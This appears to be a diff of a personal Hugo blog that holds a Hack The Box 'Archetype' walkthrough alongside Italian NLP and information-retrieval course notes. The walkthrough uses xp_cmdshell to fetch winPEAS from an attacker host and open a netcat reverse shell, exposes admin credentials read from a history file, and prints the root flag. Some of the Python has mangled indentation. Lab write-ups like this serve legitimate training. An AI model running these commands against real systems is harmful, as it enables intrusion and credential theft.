-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">winpeas --help
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">winpeas --help
 &gt; peass ~ Privilege Escalation Awesome Scripts SUITE
 
 /usr/share/peass/winpeas
@@ -2312,12 +2312,12 @@ machine (that is by-default listening on port 8000).
 <strong><em>Remember to run the command from the directory where the winpeas .exe
 files are stored!</em></strong> (I lost a lot of time on this one point).</p>
 <p>The directory should be /usr/share/peass/winpeas.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server
 </code></pre></div><p>Now we can use <strong>powershell</strong> to inject the file!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&#39;</span>;
 </code></pre></div><p>The file should be loaded in the target machine. Now it&rsquo;s just matter
 of executing it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;c:\\Users\Public\\winPEASx64.exe&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;c:\\Users\Public\\winPEASx64.exe&#39;</span>;
 
 [...]
 <span style="color:#960050;background-color:#1e0010">╔══════════╣</span> <span style="color:#66d9ef">Found</span> History Files
@@ -2328,7 +2328,7 @@ File: <span style="color:#66d9ef">C</span>:<span style="color:#960050;background
 [...]
 </code></pre></div><p>History files are usually vulnerable and a good source of information,
 let&rsquo;s see what&rsquo;s inside:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#39;</span>;
 
 net.exe use T: <span style="color:#960050;background-color:#1e0010">\\</span>Archetype<span style="color:#960050;background-color:#1e0010">\</span>backups <span style="color:#f92672">/</span><span style="color:#66d9ef">user</span>:administrator MEGACORP_4dm1n<span style="color:#f92672">!!</span>
 </code></pre></div><p>We found administrator credentials!</p>
@@ -2339,7 +2339,7 @@ net.exe use T: <span style="color:#960050;background-color:#1e0010">\\</span>Arc
 <h4 id="reverseshell">ReverseShell<a href="#reverseshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>Now that we have admin credentials, it&rsquo;s time to spawn a reverse-shell.</p>
 <p><a href="https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/">https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&#34;</span>;
 </code></pre></div><p>Now we can just navigate to C:\Users\sql_svc\Desktop and get the
 user flag.
 We are not done yet, because we still have to find the <strong>root flag</strong>.</p>
@@ -2348,10 +2348,10 @@ cmd prompt, so we need to find a way to spawn a shell <em>as administrator</em>.
 Guess what, impacket will help us one more time!
 <a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes">https://blog.ropnop.com/using-credentials-to-own-windows-boxes</a></p>
 <p>We can use <strong>psexec.py</strong> to do exactly what we need:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psexec.py Archetype/administrator@10.129.189.185
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psexec.py Archetype/administrator@10.129.189.185
 </code></pre></div><p>Now just navigate to C:\Users\Administrator\Desktop and get
 the root flag. You can use</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">more root.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">more root.txt
 </code></pre></div><blockquote>
 <p>root flag &ndash;&gt; b91ccec3305e98240082d4474b848528</p>
 </blockquote>
@@ -2433,21 +2433,21 @@ A livello strutturale sono quindi dei <em>dizionari</em> che contengono associaz
 <p>In questo script vengono trattati i seguenti argomenti:
 (i) Generazione dei token, (ii) Rimozione delle stopwords, (iii) Lemmatizzazione,
 (iv) Stemming, (v) Tagging.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
 <span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> stopwords
 <span style="color:#f92672">from</span> nltk.stem.porter <span style="color:#f92672">import</span> PorterStemmer
 <span style="color:#f92672">from</span> nltk.stem.lancaster <span style="color:#f92672">import</span> LancasterStemmer
 
 text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This is a tests&#34;</span>
 tokens <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>word_tokenize(text)
-<span style="color:#66d9ef">print</span>(tokens)
+print(tokens)
 
 <span style="color:#75715e"># Stopwords removal and Lemmatization</span>
 wnl <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>WordNetLemmatizer()
 <span style="color:#75715e"># per stampare tutte le parole che non sono stopwords.</span>
 <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens:
     <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> stopwords<span style="color:#f92672">.</span>words(<span style="color:#e6db74">&#39;english&#39;</span>):
-    <span style="color:#66d9ef">print</span>(wnl<span style="color:#f92672">.</span>lemmatize(t))
+	print(wnl<span style="color:#f92672">.</span>lemmatize(t))
 
 <span style="color:#75715e"># --&gt; [&#39;This&#39;, &#39;is&#39;, &#39;a&#39;, &#39;tests&#39;]</span>
 <span style="color:#75715e">#     This</span>
@@ -2457,34 +2457,34 @@ wnl <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span
 <span style="color:#75715e"># Stemming, using Porter and Lancaster, two popular stemmers</span>
 <span style="color:#75715e"># They give the same output for easy input</span>
 porter <span style="color:#f92672">=</span> PorterStemmer()
-<span style="color:#66d9ef">print</span>([porter<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])
+print([porter<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])
 
 lancaster <span style="color:#f92672">=</span> LancasterStemmer()
-<span style="color:#66d9ef">print</span>([lancaster<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])
+print([lancaster<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])
 
 <span style="color:#75715e"># POS tagging a list of lemmatizen tokens!</span>
-<span style="color:#66d9ef">print</span>([nltk<span style="color:#f92672">.</span>pos_tag([wnl<span style="color:#f92672">.</span>lemmatize(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])])
+print([nltk<span style="color:#f92672">.</span>pos_tag([wnl<span style="color:#f92672">.</span>lemmatize(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])])
 <span style="color:#75715e"># --&gt; [[(&#39;This&#39;, &#39;DT&#39;), (&#39;is&#39;, &#39;VBZ&#39;), (&#39;a&#39;, &#39;DT&#39;), (&#39;test&#39;, &#39;NN&#39;)]]</span>
 </code></pre></div><p><strong>Esercizio 1:</strong></p>
 <p>eseguire le seguenti operazioni: (i)Tokenization, (ii)Elimination of stopwords, (iii)Stemming, (iv) Selection of nouns
 su un file .txt contenente un libro di testo.
 In questo caso ho scaricato una copia locale del file, per semplicità.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
 <span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> stopwords
 <span style="color:#f92672">from</span> nltk.stem.porter <span style="color:#f92672">import</span> PorterStemmer
 
 path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./book.txt&#34;</span>
 file <span style="color:#f92672">=</span> open(path)
 raw <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
-<span style="color:#66d9ef">print</span>(len(raw))
+print(len(raw))
 
 <span style="color:#75715e">#step1: tokenization</span>
 tokens <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>word_tokenize(raw)
-<span style="color:#66d9ef">print</span>(tokens[:<span style="color:#ae81ff">20</span>])
+print(tokens[:<span style="color:#ae81ff">20</span>])
 
 <span style="color:#75715e">#step2: eliminate stopwords</span>
 no_stop_tokens <span style="color:#f92672">=</span> [t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> stopwords<span style="color:#f92672">.</span>words(<span style="color:#e6db74">&#39;english&#39;</span>)]
-<span style="color:#66d9ef">print</span>(len(no_stop_tokens))
+print(len(no_stop_tokens))
 
 <span style="color:#75715e">#step3: stemming</span>
 porter <span style="color:#f92672">=</span> PorterStemmer()
@@ -2492,9 +2492,9 @@ stemmed_tokens <span style="color:#f92672">=</span> ([porter<span style="color:#
 
 <span style="color:#75715e">#step4: get nouns thanks to tagging</span>
 tagged_tokens <span style="color:#f92672">=</span> (nltk<span style="color:#f92672">.</span>pos_tag([t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> stemmed_tokens]))
-<span style="color:#66d9ef">print</span>(tagged_tokens[:<span style="color:#ae81ff">20</span>])
+print(tagged_tokens[:<span style="color:#ae81ff">20</span>])
 nouns <span style="color:#f92672">=</span> [t[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tagged_tokens <span style="color:#66d9ef">if</span> t[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;NN&#39;</span>]
-<span style="color:#66d9ef">print</span>(nouns[:<span style="color:#ae81ff">20</span>])
+print(nouns[:<span style="color:#ae81ff">20</span>])
 </code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
@@ -2606,7 +2606,7 @@ parametri come la distanza.</li>
 </li>
 </ol>
 <p>Ecco un&rsquo;approccio per implementare il tutto:</p>
-<pre><code class="language-example" data-lang="example">for each noun N, for each sense Sn of N:
+<pre tabindex="0"><code class="language-example" data-lang="example">for each noun N, for each sense Sn of N:
   compute confidence Csn in choosing sn as sense of N
 select sense with higher confidence
 </code></pre><p>Ora la domanda è: come calcolo la <code>confidence</code> \(C_{s_{n}}\) ?</p>
@@ -2614,7 +2614,7 @@ select sense with higher confidence
 nel contesto! Poi per calcolare la similitudine posso usare tecniche come la <em>path-based</em>,
 già discussa in precedenza.</p>
 <p>Ricapitolando, ecco lo pseudocodice dell&rsquo;algoritmo:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">max_confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">max_confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 <span style="color:#66d9ef">for</span> each Si synset di I:
   confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
   <span style="color:#66d9ef">for</span> each J term <span style="color:#f92672">in</span> context:
@@ -2622,35 +2622,35 @@ già discussa in precedenza.</p>
     <span style="color:#66d9ef">for</span> each Sj synset of J:
       similarity <span style="color:#f92672">=</span> simil(Sj, Si)
       <span style="color:#66d9ef">if</span>(similarity <span style="color:#f92672">&gt;</span> max):
-    max <span style="color:#f92672">=</span> similarity
+	max <span style="color:#f92672">=</span> similarity
     confidence <span style="color:#f92672">+=</span> max
   <span style="color:#66d9ef">if</span>(confidence <span style="color:#f92672">&gt;</span> max_confidence):
     max_confidence <span style="color:#f92672">=</span> confidence
 pick(synseth_with_confidence(max_confidence))
 </code></pre></div><p>Codice effettivo di un semplice word sense disambiguator in python:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disambiguateTerms</span>(terms):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disambiguateTerms</span>(terms):
   <span style="color:#66d9ef">for</span> t_i <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_i is target term</span>
-    selSense <span style="color:#f92672">=</span> None
+    selSense <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
     selScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
     <span style="color:#66d9ef">for</span> s_ti <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_i, wn<span style="color:#f92672">.</span>NOUN):
       score_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
       <span style="color:#66d9ef">for</span> t_j <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_j term in t_i&#39;s context window</span>
-    <span style="color:#66d9ef">if</span> (t_i<span style="color:#f92672">==</span>t_j):
-      <span style="color:#66d9ef">continue</span>
-    bestScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
-      <span style="color:#66d9ef">for</span> s_tj <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_j, wn<span style="color:#f92672">.</span>NOUN):
-        tempScore <span style="color:#f92672">=</span> s_ti<span style="color:#f92672">.</span>wup_similarity(s_tj)
-        <span style="color:#66d9ef">if</span> (tempScore<span style="color:#f92672">&gt;</span>bestScore):
-          bestScore<span style="color:#f92672">=</span>tempScore
-      score_i <span style="color:#f92672">=</span> score_i <span style="color:#f92672">+</span> bestScore
+	<span style="color:#66d9ef">if</span> (t_i<span style="color:#f92672">==</span>t_j):
+	  <span style="color:#66d9ef">continue</span>
+	bestScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
+	  <span style="color:#66d9ef">for</span> s_tj <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_j, wn<span style="color:#f92672">.</span>NOUN):
+	    tempScore <span style="color:#f92672">=</span> s_ti<span style="color:#f92672">.</span>wup_similarity(s_tj)
+	    <span style="color:#66d9ef">if</span> (tempScore<span style="color:#f92672">&gt;</span>bestScore):
+	      bestScore<span style="color:#f92672">=</span>tempScore
+	  score_i <span style="color:#f92672">=</span> score_i <span style="color:#f92672">+</span> bestScore
       <span style="color:#66d9ef">if</span> (score_i<span style="color:#f92672">&gt;</span>selScore):
-    selScore <span style="color:#f92672">=</span> score_i
-    selSense <span style="color:#f92672">=</span> s_ti
-    <span style="color:#66d9ef">if</span> (selSense <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None):
-      <span style="color:#66d9ef">print</span>(t_i,<span style="color:#e6db74">&#34;: &#34;</span>,selSense,<span style="color:#e6db74">&#34;, &#34;</span>,selSense<span style="color:#f92672">.</span>definition())
-      <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Score: &#34;</span>,selScore)
+	selScore <span style="color:#f92672">=</span> score_i
+	selSense <span style="color:#f92672">=</span> s_ti
+    <span style="color:#66d9ef">if</span> (selSense <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
+      print(t_i,<span style="color:#e6db74">&#34;: &#34;</span>,selSense,<span style="color:#e6db74">&#34;, &#34;</span>,selSense<span style="color:#f92672">.</span>definition())
+      print(<span style="color:#e6db74">&#34;Score: &#34;</span>,selScore)
     <span style="color:#66d9ef">else</span>:
-      <span style="color:#66d9ef">print</span>(t_i,<span style="color:#e6db74">&#34;: --&#34;</span>)
+      print(t_i,<span style="color:#e6db74">&#34;: --&#34;</span>)
 </code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
@@ -2659,7 +2659,7 @@ pick(synseth_with_confidence(max_confidence))
 <p>Query Expansion</p>
 <p>Esercizio sull&rsquo;espansione di query.
 Proposta di algoritmo / soluzione:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
 <span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> stopwords
 <span style="color:#f92672">from</span> nltk.stem.porter <span style="color:#f92672">import</span> PorterStemmer
 <span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> wordnet <span style="color:#66d9ef">as</span> wn
@@ -2668,32 +2668,32 @@ Proposta di algoritmo / soluzione:</p>
     selected_syns <span style="color:#f92672">=</span> []
     syns_defs <span style="color:#f92672">=</span> []
     <span style="color:#66d9ef">for</span> t_i <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_i is target term</span>
-    selSense <span style="color:#f92672">=</span> None
-    selScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
-    <span style="color:#66d9ef">for</span> s_ti <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_i, wn<span style="color:#f92672">.</span>NOUN):
-        score_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
-        <span style="color:#66d9ef">for</span> t_j <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_j term in t_i&#39;s context window</span>
-        <span style="color:#66d9ef">if</span> (t_i<span style="color:#f92672">==</span>t_j):
-            <span style="color:#66d9ef">continue</span>
-        bestScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
-        <span style="color:#66d9ef">for</span> s_tj <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_j, wn<span style="color:#f92672">.</span>NOUN):
-            tempScore <span style="color:#f92672">=</span> s_ti<span style="color:#f92672">.</span>wup_similarity(s_tj)
-            <span style="color:#66d9ef">if</span> (tempScore<span style="color:#f92672">&gt;</span>bestScore):
-            bestScore<span style="color:#f92672">=</span>tempScore
-        score_i <span style="color:#f92672">=</span> score_i <span style="color:#f92672">+</span> bestScore
-        <span style="color:#66d9ef">if</span> (score_i<span style="color:#f92672">&gt;</span>selScore):
-        selScore <span style="color:#f92672">=</span> score_i
-        selSense <span style="color:#f92672">=</span> s_ti
-    <span style="color:#66d9ef">if</span> (selSense <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None):
-        selected_syns<span style="color:#f92672">.</span>append(selSense)
-        syns_defs<span style="color:#f92672">.</span>append(selSense<span style="color:#f92672">.</span>definition())
+	selSense <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+	selScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
+	<span style="color:#66d9ef">for</span> s_ti <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_i, wn<span style="color:#f92672">.</span>NOUN):
+	    score_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
+	    <span style="color:#66d9ef">for</span> t_j <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_j term in t_i&#39;s context window</span>
+		<span style="color:#66d9ef">if</span> (t_i<span style="color:#f92672">==</span>t_j):
+		    <span style="color:#66d9ef">continue</span>
+		bestScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
+		<span style="color:#66d9ef">for</span> s_tj <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_j, wn<span style="color:#f92672">.</span>NOUN):
+		    tempScore <span style="color:#f92672">=</span> s_ti<span style="color:#f92672">.</span>wup_similarity(s_tj)
+		    <span style="color:#66d9ef">if</span> (tempScore<span style="color:#f92672">&gt;</span>bestScore):
+			bestScore<span style="color:#f92672">=</span>tempScore
+		score_i <span style="color:#f92672">=</span> score_i <span style="color:#f92672">+</span> bestScore
+	    <span style="color:#66d9ef">if</span> (score_i<span style="color:#f92672">&gt;</span>selScore):
+		selScore <span style="color:#f92672">=</span> score_i
+		selSense <span style="color:#f92672">=</span> s_ti
+	<span style="color:#66d9ef">if</span> (selSense <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
+	    selected_syns<span style="color:#f92672">.</span>append(selSense)
+	    syns_defs<span style="color:#f92672">.</span>append(selSense<span style="color:#f92672">.</span>definition())
     <span style="color:#66d9ef">return</span> selected_syns, syns_defs
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">expand_query</span>(syns):
     res <span style="color:#f92672">=</span> []
     <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> syns:
-    <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>lemmas():
-          res<span style="color:#f92672">.</span>append(l<span style="color:#f92672">.</span>name())
+	<span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>lemmas():
+	      res<span style="color:#f92672">.</span>append(l<span style="color:#f92672">.</span>name())
     <span style="color:#66d9ef">return</span> res
 
 
@@ -2702,11 +2702,11 @@ tokens <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</s
 nostokens <span style="color:#f92672">=</span> [t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> stopwords<span style="color:#f92672">.</span>words(<span style="color:#e6db74">&#39;english&#39;</span>)]
 tagged_tokens <span style="color:#f92672">=</span> (nltk<span style="color:#f92672">.</span>pos_tag([t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> nostokens]))
 pool <span style="color:#f92672">=</span> [wn<span style="color:#f92672">.</span>morphy(x[<span style="color:#ae81ff">0</span>]) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> tagged_tokens]
-<span style="color:#66d9ef">print</span>(pool)
+print(pool)
 
 selected_syns, syns_def <span style="color:#f92672">=</span> disambiguateTerms(pool)
 expanded_query <span style="color:#f92672">=</span> expand_query(selected_syns)
-<span style="color:#66d9ef">print</span>(expanded_query)
+print(expanded_query)
 </code></pre></div><hr>
 </li>
 </ul>
@@ -2821,7 +2821,7 @@ Ovviamente la grandezza del vocabolario dipende da tutto il preprocessing che
 viene fatto, quindi da come vengono generati i token e come vengono filtrati.</p>
 <p>In generale, per gli inverted index <em>word-based</em> è circa \(O(n)\).
 Solitamente è attorno al 40% se vengono omesse delle stopwords, altrimenti
-se vengono mantenute si parla circa dell&rsquo;80%. Nel <em>document based</em> invece
+se vengono mantenute si parla circa dell'80%. Nel <em>document based</em> invece
 si parla del di valori tra il 20% e il 40%.</p>
 </li>
 </ul>
@@ -2901,7 +2901,7 @@ la lista (ordinata) di documenti in cui compare la parola;</li>
 <li>\(p2\) &ndash;&gt; puntatore al primo elemento della posting list di &ldquo;science&rdquo;;</li>
 </ul>
 <!-- raw HTML omitted -->
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">answer <span style="color:#f92672">=</span> []
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">answer <span style="color:#f92672">=</span> []
 <span style="color:#66d9ef">while</span> p1 <span style="color:#f92672">!=</span> NULL <span style="color:#f92672">and</span> p2 <span style="color:#f92672">!=</span> NULL:
   <span style="color:#66d9ef">if</span> (doc_ID(p1) <span style="color:#f92672">==</span> doc_ID(p2)):
     answer<span style="color:#f92672">.</span>append(doc_ID(p1))
@@ -2982,7 +2982,7 @@ Ecco lo pseudocodice, da applicare ad ogni documento \(d \in D\):</p>
 </ul>
 <p>In questo caso, si intende semplicemente ritornare la lista dei documenti
 che contengono la frase cercata.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> each position p <span style="color:#f92672">in</span> Ps:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> each position p <span style="color:#f92672">in</span> Ps:
   <span style="color:#66d9ef">for</span> each keyword ki <span style="color:#f92672">!=</span> ks: <span style="color:#75715e"># per tutte le altre keyword della frase</span>
     use BinarySearch to find a position (p<span style="color:#f92672">+</span>i<span style="color:#f92672">-</span>s) <span style="color:#f92672">in</span> Pi
   <span style="color:#66d9ef">if</span> correct position <span style="color:#66d9ef">for</span> each keyword found, add d to answer <span style="color:#75715e"># d is current document</span>
@@ -2999,7 +2999,7 @@ che contengono la frase cercata.</p>
   </figure>
 
 
-<pre><code class="language-example" data-lang="example">Questa pagina (in italiano) contiene i miei appunti del corso di
+<pre tabindex="0"><code class="language-example" data-lang="example">Questa pagina (in italiano) contiene i miei appunti del corso di
 &quot;Linguaggi e Compilatori&quot; del corso di laura triennale in informatica di Unimore.
 Il pdf contiene i miei appunti presi durante le lezioni.
 Il materiale qui fornito non è sostitutivo alle slide del corso e/o il famigerato dragon book.
@@ -3036,7 +3036,7 @@ Il materiale qui fornito non è sostitutivo alle slide del corso e/o il famigera
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
